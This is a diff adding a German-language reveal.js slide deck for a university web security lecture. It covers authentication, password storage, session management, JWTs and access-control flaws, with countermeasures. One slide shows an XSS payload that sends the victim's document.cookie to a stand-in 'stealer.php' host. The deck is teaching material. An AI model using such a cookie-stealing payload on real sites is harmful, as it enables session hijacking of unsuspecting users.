@@ -1,0 +1,2462 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="author" content="Andreas Happe">
+  <title>Web Security</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js@4.1.3//dist/reset.css">
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js@4.1.3//dist/reveal.css">
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js@4.1.3//dist/theme/solarized.css" id="theme">
+  <link rel="stylesheet" href="custom.css"/>
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section id="title-slide">
+  <h1 class="title">Web Security</h1>
+  <p class="author">Andreas Happe</p>
+</section>
+
+<section id="meta-stuff" class="title-slide slide level1">
+<h1>Meta-Stuff</h1>
+
+</section>
+
+<section>
+<section id="der-vortragende-andreas-happe" class="title-slide slide level1">
+<h1>Der Vortragende: Andreas Happe</h1>
+
+</section>
+<section id="andreas-happe-how-to" class="slide level2">
+<h2>Andreas Happe: How To?</h2>
+<ul>
+<li>per-Du, per-Sie?</li>
+<li>Erinnerung, falls ich zu leise werde</li>
+</ul>
+<blockquote>
+<p>I think there should be more than one voice in a healthy society.</p>
+</blockquote>
+<p>Li Wenliang 12.10.1986-7.2.2020</p>
+</section>
+<section id="education-and-work" class="slide level2">
+<h2>Education and Work</h2>
+<table>
+<thead>
+<tr class="header">
+<th>Jahr</th>
+<th>Was</th>
+<th>Skills</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1996-2001</td>
+<td>HTL Villach</td>
+<td>Für EDV und Organisation</td>
+</tr>
+<tr class="even">
+<td>2001-2002</td>
+<td>Zivildienst</td>
+<td>Access Programmieren..</td>
+</tr>
+<tr class="odd">
+<td>2002-2009</td>
+<td>TU Wien</td>
+<td>Software Engineering</td>
+</tr>
+<tr class="even">
+<td>2008-2009</td>
+<td>BlackWhale</td>
+<td>CTO, RoR</td>
+</tr>
+<tr class="odd">
+<td>2006-2018</td>
+<td>AIT</td>
+<td>Software Engineering, C, Scala, Java, Kotlin</td>
+</tr>
+<tr class="even">
+<td>since 2013</td>
+<td>CoreTec</td>
+<td>Pen-Tester Web/Android/Whatever</td>
+</tr>
+<tr class="odd">
+<td>2016?</td>
+<td>Offensive Security</td>
+<td>OSCP</td>
+</tr>
+<tr class="even">
+<td>since 2019</td>
+<td>FH/Technikum Wien</td>
+<td>Lektor WebSec, SecOps (nicht mehr)</td>
+</tr>
+<tr class="odd">
+<td>since 2020</td>
+<td>FH/Technikum Wien</td>
+<td>Lektor WebAppSec</td>
+</tr>
+<tr class="even">
+<td>since 2021</td>
+<td>App-Sec Betreuung von Unternehmen</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="other-fun-security-stuff" class="slide level2">
+<h2>Other Fun Security Stuff</h2>
+<table>
+<thead>
+<tr class="header">
+<th>Jahr</th>
+<th>Was</th>
+<th>Skills</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>since 2017</td>
+<td>ÖNORM</td>
+<td>A77.00 Sichere Webapplikationen</td>
+</tr>
+<tr class="even">
+<td>since 2019</td>
+<td>OWASP</td>
+<td>Leader Vienna Chapter</td>
+</tr>
+<tr class="odd">
+<td>2018</td>
+<td>OWASP</td>
+<td>Top Contributer MSTG</td>
+</tr>
+<tr class="even">
+<td>2019</td>
+<td>NATO Locked Shields</td>
+<td>Teamlead Linux + Teamlead Web</td>
+</tr>
+<tr class="odd">
+<td>2019</td>
+<td>We Are Developers</td>
+<td>Sounding Board Security</td>
+</tr>
+<tr class="even">
+<td>2020</td>
+<td>NIS-Richtlinie</td>
+<td>Auditor Kritische Infrastruktur</td>
+</tr>
+</tbody>
+</table>
+</section></section>
+<section>
+<section id="owasp-top-10" class="title-slide slide level1">
+<h1>OWASP Top 10</h1>
+
+</section>
+<section id="owasp-top-10-2017" class="slide level2">
+<h2>OWASP Top 10 2017</h2>
+<img data-src="0x04_owasp_top_10.png" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="owasp-top-10-2021" class="slide level2">
+<h2>OWASP top 10 2021</h2>
+<img data-src="0x04_owasp_top_10_2021.png" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="ansatz" class="slide level2">
+<h2>Ansatz</h2>
+<ul>
+<li>starten mit high-level Problemen (Authentication/Authorization)</li>
+<li>danach low-level Probleme (Injections)</li>
+</ul>
+</section></section>
+<section>
+<section id="identification-authentication" class="title-slide slide level1">
+<h1>Identification / Authentication</h1>
+
+</section>
+<section id="identification" class="slide level2">
+<h2>Identification</h2>
+<ul>
+<li>Benutzer “claims” seine Identität</li>
+<li>Verschiedene Möglichkeiten
+<ul>
+<li>Benutzername und/oder Email</li>
+<li>SmartCards</li>
+<li>postIdent, videoIdent, bildIdent</li>
+</ul></li>
+<li>Häufig mit Authentication in einer Operation</li>
+</ul>
+</section>
+<section id="authentication" class="slide level2">
+<h2>Authentication</h2>
+<ul>
+<li>Validierung der Benutzeridentität</li>
+<li>Verschiedene Methoden/Faktoren
+<ul>
+<li>something-the-user-knows</li>
+<li>something-the-user-possesses</li>
+<li>something-the-user-is</li>
+<li>weird stuff: next-cloud video</li>
+</ul></li>
+</ul>
+</section>
+<section id="kombination-mehrerer-faktoren" class="slide level2">
+<h2>Kombination mehrerer Faktoren</h2>
+<ul>
+<li>Multi-Faktoren-Auth</li>
+<li>Unterschiedliche Faktoren kombinieren
+<ul>
+<li>Beispiel: Bankomatkarte</li>
+</ul></li>
+<li>Bitte nicht mehr SMS verwenden
+<ul>
+<li>SS7, Sniffer (Nokia 3210), etc.</li>
+<li>Alternative: Mobile-Application</li>
+</ul></li>
+</ul>
+</section></section>
+<section>
+<section id="login-dialog" class="title-slide slide level1">
+<h1>Login-Dialog</h1>
+
+</section>
+<section id="grundprinzip" class="slide level2">
+<h2>Grundprinzip</h2>
+<ul>
+<li><p>Keep-it-simple-and-stupid</p>
+<img data-src="0x04_login.png" title="fig:" class="stretch" alt="Picture" /></li>
+</ul>
+</section>
+<section id="login-dialog-dont" class="slide level2">
+<h2>Login-Dialog: Don’t</h2>
+<ul>
+<li>getrennte Benutzernamen- und passwort Masken</li>
+<li>Authentication through Email (u.a. long-term problems)</li>
+<li>HTTP BASIC basierte Authentication (cis..)</li>
+<li>Flash/Silverlight/Java-Applets</li>
+</ul>
+</section>
+<section id="angriff-user-enumeration" class="slide level2">
+<h2>Angriff: User Enumeration</h2>
+<ul>
+<li><p>Angreifer kann Informationen über Vorhandensein eines Benutzers erraten</p>
+<blockquote>
+<p>“Username nicht bekannt”</p>
+</blockquote></li>
+<li><p>Im Login Form einfach: generische Fehlermeldungen verwenden</p></li>
+<li><p>Problem:</p>
+<ul>
+<li>was bei User-Anlegen und Passwort-Vergessen Funktionen?</li>
+<li>Timing</li>
+</ul></li>
+</ul>
+</section>
+<section id="angriff-brute-force" class="slide level2">
+<h2>Angriff: Brute-Force</h2>
+<ul>
+<li>brutal einfach</li>
+<li>Online vs. Offline Brute-Force Angriff</li>
+<li>Passwortlisten vs. alle-Möglichkeiten-durchprobieren</li>
+<li>Tools: hydra, burp, etc.</li>
+</ul>
+</section>
+<section id="passwortlisten" class="slide level2">
+<h2>Passwortlisten</h2>
+<ul>
+<li>Gute Passwortlisten sind mittlerweile verfügbar</li>
+<li>Passwortlisten können auch mittels Webseiten generiert werden</li>
+<li>Passwortlisten werden mittels Deep Learning / AI generiert</li>
+</ul>
+</section>
+<section id="brute-force-gegenmassnahmen" class="slide level2">
+<h2>Brute-Force Gegenmassnahmen</h2>
+<ul>
+<li>Good Password Policy</li>
+<li>Rate-Limits</li>
+<li>(Temporary) User Sperre – DoS Problem</li>
+<li>Captchas</li>
+<li>Multi-Faktor Authentication</li>
+</ul>
+</section>
+<section id="logout-funktion" class="slide level2">
+<h2>Logout-Funktion</h2>
+<ul>
+<li>User sollte sich ausloggen können</li>
+<li>User sollte die Möglichkeit besitzen, alle Sessions zu beenden</li>
+</ul>
+</section></section>
+<section>
+<section id="passwörter" class="title-slide slide level1">
+<h1>Passwörter</h1>
+
+</section>
+<section id="sso-social-login" class="slide level2">
+<h2>SSO? Social Login?</h2>
+</section>
+<section id="falls-passwörter-gespeichert-werden.." class="slide level2">
+<h2>Falls Passwörter gespeichert werden..</h2>
+<ul>
+<li>niemals plain-text speichern (inkl. Logs, etc.)</li>
+<li>immer eine Key-Derivation Function verwenden (bcrypt, scrypt, pdkdf2)</li>
+<li>Key-Stretching verwenden</li>
+<li>immer in der Applikation hashen (nicht erst durch DB)</li>
+<li>Gilt auch für Passwort-ähnliche Daten</li>
+</ul>
+</section>
+<section id="evolution-der-passwort-hashes" class="slide level2">
+<h2>Evolution der Passwort-Hashes</h2>
+<ol type="1">
+<li>Nothing</li>
+<li>Hashes</li>
+<li>Salt+Hashes (and Pepper)</li>
+<li>Key-Derivation Functions</li>
+<li>Single-Sign On (?)</li>
+</ol>
+</section>
+<section id="passwort-cracking" class="slide level2">
+<h2>Passwort Cracking</h2>
+<ul>
+<li>offline möglich</li>
+<li>automatisiertes Erkennen bei Offline-Cracking nicht möglich</li>
+</ul>
+</section>
+<section id="frage-zur-performance" class="slide level2">
+<h2>Frage zur Performance</h2>
+<p>Hashcat mit einer <a href="https://gist.github.com/Chick3nman/bb22b28ec4ddec0cb5f59df97c994db4">Geforce GTX 3080</a></p>
+<ul>
+<li>bei MD5?</li>
+<li>bei bcrypt?</li>
+</ul>
+</section>
+<section id="passwort-richtlinien" class="slide level2">
+<h2>Passwort-Richtlinien</h2>
+<ul>
+<li>NIST 800-63-3: Digital Identity Guidelines</li>
+<li>Zwischen 8..64 Zeichen</li>
+<li>Unterscheidung Zeichen und Byte!</li>
+<li>Remove periodic password change requirements</li>
+<li>Drop the algorithmic complexity song and dance</li>
+<li>Require screening of new passwords against lists of commonly used or compromised passwords</li>
+<li>No Password Hints</li>
+</ul>
+</section>
+<section id="screening-haveibeenpwned.com" class="slide level2">
+<h2>Screening: Haveibeenpwned.com</h2>
+<ul>
+<li>Offline: Passwort-Liste (SHA1): ca. 10 Gigabyte</li>
+<li>Online:
+<ul>
+<li>v1: Übermittlung von Hashes</li>
+<li>v2: k-Anonymity</li>
+</ul></li>
+</ul>
+</section>
+<section id="haveibeenpwned-api-v2" class="slide level2">
+<h2>Haveibeenpwned API v2</h2>
+<ul>
+<li>hash = hash(pw)</li>
+<li>hash[0..5] wird zum Server geschickt</li>
+<li>Antwort: Passwort-Hashes die mit den fünf Buchstaben (des Hashes) beginnen und wie häufig das jeweilige Passwort vorgekommen ist</li>
+<li>Benutzer vergleicht nun ob sein hash in der Antwort vorkommt</li>
+<li>Der Service kennt allerdings den konkreten Hash (hoffentlich) nicht mehr</li>
+</ul>
+</section>
+<section id="passwort-vergessen-funktion" class="slide level2">
+<h2>Passwort-Vergessen Funktion</h2>
+<ul>
+<li>Keine Passwort-Fragen!</li>
+<li>Meistens per Link in einer Email</li>
+<li>Link sollte nur einmal und nur für den einen Account funktionieren
+<ul>
+<li><a href="">/user/passwort-reset?token=xxxx</a></li>
+</ul></li>
+<li>Nicht:
+<ul>
+<li><a href="">/user/passwort-reset?username=ah</a></li>
+</ul></li>
+<li>Alternate Transport: z. B. eingeschriebener Brief bei SVA</li>
+</ul>
+</section>
+<section id="passwort-neu-setzen" class="slide level2">
+<h2>Passwort neu setzen</h2>
+<p>Benutzer will sein Passwort ändern</p>
+<ul>
+<li>User muss authenticated sein</li>
+<li>Passwort wird nur für den aktuellen User verändert</li>
+<li>Das alte Passwort muss im Zuge der gleichen Operation erfragt werden</li>
+</ul>
+</section>
+<section id="optionale-funktionen-bei-passwort-änderungreset" class="slide level2">
+<h2>Optionale Funktionen bei Passwort Änderung/Reset</h2>
+<ul>
+<li>Notifications versenden</li>
+<li>Notifications out-of-band versenden</li>
+<li>Alle Sessions des aktuellen Benutzers beenden</li>
+</ul>
+</section></section>
+<section>
+<section id="session-management" class="title-slide slide level1">
+<h1>Session Management</h1>
+<ul>
+<li>Recap: <a href="https://andreashappe.github.io/lecture-web-security/build/0x03_web_applications.md.html#/sessions">Warum Sessions?</a></li>
+</ul>
+</section>
+<section id="gewünschter-session-ablauf" class="slide level2">
+<h2>Gewünschter Session-Ablauf</h2>
+<ul>
+<li>Während des Logins wird ein neues Session-Token/Cookie generiert</li>
+<li>Bei jedem Folge-Zugriff wird über dieses Token an den Server übertragen</li>
+<li>(Die Benutzeridentität wird geprüft)</li>
+<li>Beim Logout wird das Token im Browser gelöscht und am Server als inaktiv vermerkt</li>
+<li>Logout aller Sessions sollte möglich sein</li>
+</ul>
+</section>
+<section id="client-vs.-server-side-session" class="slide level2">
+<h2>Client vs. Server-Side Session</h2>
+<ul>
+<li>unterschiedlichen Arten Sessions zu bilden</li>
+</ul>
+</section>
+<section id="client-seitig" class="slide level2">
+<h2>Client-Seitig</h2>
+<ul>
+<li>Direktes Speichern der Daten im Cookie</li>
+<li>Integrität und Confidentiality muss durch Applikation sichergestellt werden</li>
+<li>Serverseitiges Invalidieren von Sessions schwer möglich</li>
+</ul>
+</section>
+<section id="server-seitig" class="slide level2">
+<h2>Server-Seitig</h2>
+<ul>
+<li>server-seitig: Random Key (Session ID) im Cookie</li>
+<li>Server-Datenbank über die der Random-Key einem Benutzer zugeordnet wird</li>
+<li>Möglichkeit der Session-Invalidation</li>
+<li>Keine sensiblen Daten innerhalb der Client-Cookies</li>
+</ul>
+</section></section>
+<section>
+<section id="session-technologien" class="title-slide slide level1">
+<h1>Session-Technologien</h1>
+
+</section>
+<section id="cookie-based-sessions" class="slide level2">
+<h2>Cookie-based Sessions</h2>
+<ul>
+<li>Cookie wird durch den Server gesetzt</li>
+<li>Cookie wird bei jedem Request automatisch durch den Browser mit übertragen</li>
+<li>Möglichkeit des Session-Timeouts und optionale Security-Flags</li>
+</ul>
+</section>
+<section id="cookie-beispiele" class="slide level2">
+<h2>Cookie-Beispiele</h2>
+<pre class="http"><code>Set-Cookie: sessionid1=0xbadc0ffee;
+Set-Cookie: sessionid2=0xbadc0ffee;Max-Age=42;
+Set-Cookie: sessionid3=0xbadc0ffee;Secure;HttpOnly;SameSite=Lax
+Set-Cookie: sessionid4=0xbadc0ffee;Path=/
+Set-Cookie: sessionid5=0xbadc0ffee;Domain=snikt.net</code></pre>
+</section>
+<section id="client-side-tokens" class="slide level2">
+<h2>Client-Side: Tokens</h2>
+<ul>
+<li>Server überträgt signiertes Token an Client</li>
+<li>Analog zu Kerberos</li>
+<li>Das Token enthält Zugriffsberechtigungen und wird (hoffentlich) signiert</li>
+<li>Häufig verwendet: <a href="https://jwt.io">JSON Web Token</a></li>
+<li>Gut für Clients, suboptimal für interaktive Browser-Sessions</li>
+</ul>
+</section>
+<section id="json-web-tokens-jwts" class="slide level2">
+<h2>Json Web Tokens (JWTs)</h2>
+<ul>
+<li>Token Format, RFC 7519</li>
+<li>Dienen zur Übertragung von Permissions</li>
+<li>Übertragung per
+<ul>
+<li>HTTP Parameter: please don’t</li>
+<li>Cookie: sameSite, httpOnly, Secure-Flags setzen</li>
+<li>HTTP Header als bearer token</li>
+</ul></li>
+</ul>
+</section>
+<section id="grundaufbau" class="slide level2">
+<h2>Grundaufbau</h2>
+<img data-src="0x07_jwt.jpeg" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="grundaufbau-1" class="slide level2">
+<h2>Grundaufbau</h2>
+<img data-src="0x07_jwt_token.png" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="probleme-bei-jwtss" class="slide level2">
+<h2>Probleme bei JWTss</h2>
+<ul>
+<li>Header nicht Integritätsgesichert
+<ul>
+<li>Beispiel: NULL alg</li>
+<li>Beispiel: HS vs RS confusion</li>
+</ul></li>
+<li>offline-cracking</li>
+<li>Confidenciality</li>
+</ul>
+</section>
+<section id="jwt-für-sessions" class="slide level2">
+<h2>JWT: für Sessions?</h2>
+<img data-src="0x05_jwt_sessions.png" title="fig:" class="stretch" alt="Picture" />
+</section></section>
+<section>
+<section id="probleme-bei-sessions" class="title-slide slide level1">
+<h1>Probleme bei Sessions</h1>
+
+</section>
+<section id="problem-session-id-wird-verloren" class="slide level2">
+<h2>Problem: Session-ID wird verloren</h2>
+<ul>
+<li>Verwendung von unverschlüsselten HTTP</li>
+</ul>
+<img data-src="0x05_session_hijacking.JPG" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="wie-kann-https-erzwungen-werden" class="slide level2">
+<h2>Wie kann HTTPS erzwungen werden</h2>
+<ul>
+<li>Cookie mit Secure-Flag: Cookie wird nur mittels HTTPS übertragen</li>
+<li>HSTS: Browser macht ein upgrade auf HTTPS bei Folgezugriffen</li>
+<li>CSP: Browser macht ein upgrade auf HTTPS bei Folgezugriffen</li>
+</ul>
+<p>Beispiele eines HTTP Response mit gesetzten Header:</p>
+<pre class="http"><code>Strict-Transport-Security: max-age=31536000; includeSubDomains
+Set-Cookie: CookieName=Wert; path=/; secure</code></pre>
+</section>
+<section id="warum-ist-ein-automatic-redirect-zu-https-nicht-ausreichend" class="slide level2">
+<h2>Warum ist ein automatic redirect zu HTTPS nicht ausreichend?</h2>
+</section>
+<section id="problem-mixed-content" class="slide level2">
+<h2>Problem: Mixed-Content</h2>
+<ul>
+<li>Cookie Drive-By, um 2010/2011 herum</li>
+<li>nur Login wird mit HTTPS geschützt</li>
+<li>Rest der Seite mittels HTTP</li>
+</ul>
+</section>
+<section id="tool-firesheep" class="slide level2">
+<h2>Tool: Firesheep</h2>
+<img data-src="0x05_firesheep.png" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="mixed-content-current-situation" class="slide level2">
+<h2>Mixed-Content: Current Situation</h2>
+<ul>
+<li>Mittlerweile: active mixed-content wird by default geblockt</li>
+<li>Chrome will Download von “gefährlichen” Inhalten mittels HTTP unterbinden</li>
+</ul>
+</section>
+<section id="problem-session-id-vorher-bestimmbar" class="slide level2">
+<h2>Problem: Session-ID vorher-bestimmbar</h2>
+<ul>
+<li>Angreifer darf Session-ID nicht erraten können</li>
+<li>Schlechte Ideen:
+<ul>
+<li>aufsteigende Zahlen</li>
+<li>MD5 auf die Systemzeit</li>
+</ul></li>
+<li>Immer einen guten Zufallszahlengenerator verwenden</li>
+<li>Entropie-Check der Session-Id</li>
+</ul>
+</section>
+<section id="problem-xss" class="slide level2">
+<h2>Problem: XSS</h2>
+<ul>
+<li>Annahme: die Webapplikation hat eine XSS-Lücke</li>
+</ul>
+<img data-src="0x05_session_hijack_xss.png" title="fig:" class="stretch" alt="Picture" />
+</section>
+<section id="beispiel-xss-extraction" class="slide level2">
+<h2>Beispiel XSS Extraction</h2>
+<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script&gt;</span>location<span class="op">.</span><span class="at">href</span> <span class="op">=</span> <span class="st">&#39;http://xyz.com/stealer.php?cookie=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+</section>
+<section id="lösung-für-xss-lücke" class="slide level2">
+<h2>Lösung für XSS-Lücke</h2>
+<ul>
+<li>keine XSS Lücken implementieren</li>
+<li>httpOnly-Flag bei Session Cookies setzen</li>
+<li>CSP verwenden</li>
+</ul>
+<pre><code>Set-Cookie: CookieName=Wert; path=/; HttpOnly</code></pre>
+</section>
+<section id="problem-session-id-als-get-parameter" class="slide level2">
+<h2>Problem: Session-ID als GET-Parameter</h2>
+<ul>
+<li>wird dadurch in Proxies, Caches, etc. gespeichert</li>
+<li>auch in Browser Historie</li>
+<li>Vermeiden durch Verwendung eines Session-Cookies</li>
+<li>Work-Around: Verwendung von POST Requests</li>
+</ul>
+</section>
+<section id="problem-session-fixation" class="slide level2">
+<h2>Problem: Session-Fixation</h2>
+<ul>
+<li>Nicht Vorbestimmen der Session, sondern Erzwingen einer Session-ID</li>
+<li>Operation mit Session als HTTP GET Parameter</li>
+<li>Social Engineering</li>
+</ul>
+</section>
+<section id="angriff-inkl.-social-engineering" class="slide level2">
+<h2>Angriff inkl. Social Engineering</h2>
+<img data-src="0x05_session_fixation.jpg" title="fig:" class="stretch" alt="Picture" />
+<ul>
+<li>Lösung: Session-ID während Login neu generieren</li>
+<li>Hint: Session bei Logout löschen ist optional</li>
+</ul>
+</section>
+<section id="abgeschwächte-variante" class="slide level2">
+<h2>“Abgeschwächte” Variante</h2>
+<ul>
+<li>ohne HTTP GET Parameter mit Session-Id</li>
+<li>Session-Id wird bei Login/Logout nicht gelöscht</li>
+</ul>
+</section></section>
+<section>
+<section id="authentication-authorization" class="title-slide slide level1">
+<h1>Authentication &amp; Authorization</h1>
+
+</section>
+<section id="basic-idea" class="slide level2">
+<h2>Basic Idea</h2>
+<ul>
+<li>Überprüfung der Benutzerberechtigung</li>
+<li>Zugriffskontrolle = Authentication + Authorization</li>
+</ul>
+</section>
+<section id="simple-facts" class="slide level2">
+<h2>Simple Facts</h2>
+<ul>
+<li>muss vor der Operation ausgeführt werden</li>
+<li>muss immer serverseitig implementiert werden</li>
+<li>zum Zeitpunkt des Zugriffs</li>
+</ul>
+</section>
+<section id="authentication-authorization-1" class="slide level2">
+<h2>Authentication / Authorization</h2>
+<p>Fehlende Authentication ist problematischer als fehlende Authorization.</p>
+</section></section>
+<section>
+<section id="problem-fehlende-serverseitige-überprüfung" class="title-slide slide level1">
+<h1>Problem: Fehlende serverseitige Überprüfung</h1>
+
+</section>
+<section id="grundproblem" class="slide level2">
+<h2>Grundproblem</h2>
+<ul>
+<li>Zugriffsrechte werden nur am Client überprüft</li>
+<li>es wird davon ausgegangen, dass die dahinterliegenden Server-Operationen nicht auffindbar sind (Security by Obscurity)</li>
+</ul>
+</section>
+<section id="beispiel-rich-client-apps-im-browser" class="slide level2">
+<h2>Beispiel: Rich-Client Apps im Browser</h2>
+<ul>
+<li>häufig: Java Applets, Flash, Silverlight</li>
+</ul>
+<p><img data-src="./0x06_silverlight.png" /></p>
+</section>
+<section id="forceful-browsing" class="slide level2">
+<h2>Forceful Browsing</h2>
+<ul>
+<li>Abhängig von der Userrolle werden unterschiedliche Bereiche angezeigt</li>
+<li>Operationen im Hintergrund überprüfen keine Authorization</li>
+<li>Beispiel: Direktzugriff auf /admin</li>
+</ul>
+</section>
+<section id="beispiel-direct-object-references" class="slide level2">
+<h2>Beispiel: Direct-Object References</h2>
+<ul>
+<li>links mit erratbaren Ids ohne Zugriffscheck</li>
+<li>z.B. /invoice/420 oder /user/1</li>
+<li>Aktuelles Bespiel: <a href="https://www.heise.de/news/Corona-Selbsttests-bei-Aldi-Negativ-Zertifikate-von-Aesku-faktisch-wertlos-5987246.html">Corona Schnelltests</a></li>
+</ul>
+<p>Also immer Authentication und Authorization testen!</p>
+</section>
+<section id="scoping-von-daten" class="slide level2">
+<h2>Scoping von Daten</h2>
+<p>Innerhalb der Applikation läuft die Applikationslogik immer im Auftrag eines Benutzers</p>
+<p>Die bearbeitenden Daten sollten so früh wie möglich auf den aktuellen Benutzer gebunden werden</p>
+</section>
+<section id="gegenbeispiel-usability" class="slide level2">
+<h2>Gegenbeispiel: Usability</h2>
+<ul>
+<li>ÖBB Tickets</li>
+<li>Download des Tickets ohne Authentication</li>
+<li>Ticket-Id/Download-Id ist zufällig gewählt</li>
+</ul>
+</section>
+<section id="scoping-von-daten-1" class="slide level2">
+<h2>Scoping von Daten</h2>
+<pre><code>GET /invoices/42</code></pre>
+<p>Negativ:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">Invoices</span><span class="at">.all.find</span>(id)</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co"># select * from invoices where id = :id;</span></span></code></pre></div>
+<p>Positiv:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode ruby"><code class="sourceCode ruby"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>current_user<span class="at">.invoices.find</span>(id)</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co"># select * from invoices where user_id = :current_user.id and id = :id</span></span></code></pre></div>
+</section></section>
+<section>
+<section id="problem-fehlende-konsistenz" class="title-slide slide level1">
+<h1>Problem: Fehlende Konsistenz</h1>
+
+</section>
+<section id="nicht-homogene-applikationen" class="slide level2">
+<h2>Nicht-homogene Applikationen</h2>
+<ul>
+<li>Authentication/Authorization ist häufig Teil des verwendeten Frameworks</li>
+<li>Problem bei gewachsenen Applikationen:
+<ul>
+<li>mehrere Programmiersprachen/Frameworks, teilweise auch Portale</li>
+<li>Brennpunkt: Plattformübergreifende Integration der Authentication</li>
+</ul></li>
+<li>Hint: Session wird häufig als GET-Parameter übergeben</li>
+</ul>
+</section>
+<section id="selbst-geschriebene-komponenten" class="slide level2">
+<h2>Selbst-geschriebene Komponenten</h2>
+<ul>
+<li>Applikation verwendet ein Framework, aber einzelne Komponenten wurden selbst geschrieben</li>
+<li>Betrifft häufig nachträgliche Erweiterungen</li>
+<li>Problem: Bei den selbst-geschriebenen Komponenten wird gerne die Authentication vergessen</li>
+</ul>
+</section>
+<section id="beispiele" class="slide level2">
+<h2>Beispiele:</h2>
+<p>Beispiel: Aktiendepot einer Bank</p>
+<pre class="url"><code>/piechart?user=username</code></pre>
+<p>Beispiel: Dokumenten-Export</p>
+<pre class="url"><code>/documents/download/1
+/documents/1.pdf</code></pre>
+</section></section>
+<section>
+<section id="problem-welche-felder-werden-überprüft" class="title-slide slide level1">
+<h1>Problem: Welche Felder werden überprüft?</h1>
+
+</section>
+<section id="beispiel-update-operation" class="slide level2">
+<h2>Beispiel: Update Operation</h2>
+<pre class="http"><code>POST /user/42/update HTTP 1/1
+
+{ “id”: “42”, “name”: “happe”}</code></pre>
+</section>
+<section id="beispiel-potentielle-probleme" class="slide level2">
+<h2>Beispiel: Potentielle Probleme</h2>
+<ul>
+<li>Zugriff auf /user/1/update?</li>
+<li>Austausch von ID im Datensatz?</li>
